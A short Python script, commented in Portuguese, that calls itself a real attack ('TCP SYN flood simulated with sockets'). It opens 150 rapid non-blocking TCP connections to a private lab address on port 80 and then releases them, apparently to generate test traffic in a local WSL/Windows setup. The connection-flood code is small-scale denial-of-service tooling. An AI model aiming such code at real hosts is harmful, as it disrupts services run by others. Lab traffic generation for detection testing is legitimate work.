import socket
import time
import sys

def run_flood():
    target_ip = "192.168.100.5" # IP do WSL / Windows
    target_port = 80            # Porta alvo
    
    print(f"=== INICIANDO ATAQUE REAL (TCP SYN FLOOD SIMULADO EM SOCKET) ===")
    print(f"Alvo: {target_ip}:{target_port}")
    print("Enviando rajada de conexões TCP rápidas a partir do host Windows...")
    
    sockets_list = []
    try:
        for i in range(150):
            # Cria um socket TCP real
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False) # Não-bloqueante para enviar rápido
            try:
                # Conecta ao alvo
                s.connect_ex((target_ip, target_port))
                sockets_list.append(s)
            except Exception:
                pass
            
            if i % 10 == 0:
                print(f"Enviados: {i} pacotes de conexão...")
            time.sleep(0.01) # 10ms de intervalo
            
        print(f"Rajada concluída! {len(sockets_list)} fluxos de conexão gerados.")
    except KeyboardInterrupt:
        print("Interrompido.")
    finally:
        # Fechar conexões
        for s in sockets_list:
            try:
                s.close()
            except Exception:
                pass
        print("Sockets liberados.")

if __name__ == "__main__":
    run_flood()
